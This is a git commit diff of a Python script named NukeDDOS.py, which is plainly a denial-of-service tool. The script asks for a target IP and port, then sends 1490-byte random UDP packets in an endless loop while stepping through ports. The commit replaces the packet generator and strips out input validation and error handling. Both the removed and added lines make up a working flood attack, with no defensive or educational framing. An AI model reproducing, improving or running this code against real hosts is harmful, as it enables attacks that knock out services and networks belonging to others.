a215dbfce64873f8ffa5926f2579fbe986adf656
Laila19 <laila.cypher19@proton.me>
2025-05-12 20:03:06 -0300

    Update NukeDDOS.py

--- NukeDDOS.py
+++ NukeDDOS.py
@@ -2,76 +2,55 @@ import sys
 import os
 import time
 import socket
-import secrets
+import random
 from datetime import datetime
 
-# Attack settings
+# Get current time
+now = datetime.now()
+hour = now.hour
+minute = now.minute
+day = now.day
+month = now.month
+year = now.year
+
+##############
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-data = secrets.token_bytes(1490)
+bytes = random._urandom(1490)
+#############
 
-# Initial interface
+# Clear screen and print banner
 os.system("clear")
-os.system("figlet 'DDos Attack'")
-
-# ASCII Art in the menu
-print("""
--------------------------------------------------------------------------------------------------
-|                                                                                                 |
-|                                                                                                 |
-|      ________   ___  ___  ___  __    _______   ________  ________  ________  ________           |
-|     |\\   ___  \\|\\  \\|\\  \\|\\  \\|\\  \\ |\\  ___ \\ |\\   ___ \\|\\   ___ \\|\\   __  \\|\\   ____\\          |
-|     \\ \\  \\\\ \\  \\ \\  \\\\  \\ \\  \\/  /|\\ \\   __/|\\ \\  \\_|\\ \\ \\  \\_|\\ \\ \\  \\\\  \\ \\  \\___|_         |
-|      \\ \\  \\\\ \\  \\ \\  \\\\ \\ \\   ___  \\ \\  \\_|/_\\ \\  \\ \\ \\ \\ \\  \\\\  \\ \\ \\_____  \\        |
-|       \\ \\  \\\\ \\  \\ \\  \\\\ \\ \\  \\\\\  \\  \\  \\_|\\ \\ \\  \\_\\ \\ \\  \\_\\  \\|____|\\  \\       |
-|        \\ \\__\\\\ \\__\\ \\_______\\ \\__\\\\ \\__\\ \\_______\\ \\_______\\ \\_______\\____\\_\\  \\      |
-|         \\|__| \\|__|\\|_______|\\|__| \\|__|\\|_______|\\|_______|\\|_______|\\|_______|\\_________\\     |
-|                                                                                \\|_________|     |
-|                                                                                                 |
-'-------------------------------------------------------------------------------------------------'
-""")
-
+os.system("figlet DDos Attack")
 print("Author   : Laila19")
 print("GitHub   : https://github.com/lailacypher")
 print()
 
-# User input
-ip = input("Target IP   : ")
-try:
-    port = int(input("Port        : "))
-except ValueError:
-    print("Error: Port must be an integer.")
-    sys.exit(1)
+# User input for target IP and port
+ip = input("Target IP: ")
+port = int(input("Port: "))
 
-# IP validation
-try:
-    socket.inet_aton(ip)
-except socket.error:
-    print("Error: Invalid IP address.")
-    sys.exit(1)
-
-# Loading animation
+# Clear screen and show attack starting progress
 os.system("clear")
 os.system("figlet Attack Starting")
-progress = ["[                    ] 0% ", "[=====               ] 25%", "[==========          ] 50%", "[===============     ] 75%", "[====================] 100%"]
-for step in progress:
-    print(step)
-    time.sleep(1)
+print("[                    ] 0% ")
+time.sleep(1)
+print("[=====               ] 25%")
+time.sleep(1)
+print("[==========          ] 50%")
+time.sleep(1)
+print("[===============     ] 75%")
+time.sleep(1)
+print("[====================] 100%")
+time.sleep(2)
 
-# Start the attack
+# Send packets in an infinite loop
 sent = 0
-try:
-    while True:
-        sock.sendto(data, (ip, port))
-        sent += 1
-        port += 1
-        print(f"Sent {sent} packets to {ip} through port {port}")
-        if port > 65535:
-            port = 1
-except KeyboardInterrupt:
-    print("\nAttack interrupted by the user.")
-    sock.close()
-    sys.exit(0)
-except Exception as e:
-    print(f"\nError: {e}")
-    sock.close()
-    sys.exit(1)
+while True:
+    sock.sendto(bytes, (ip, port))
+    sent += 1
+    port = port + 1
+    print(f"Sent {sent} packet(s) to {ip} through port: {port}")
+    
+    # Reset port after reaching 65534
+    if port == 65534:
+        port = 1
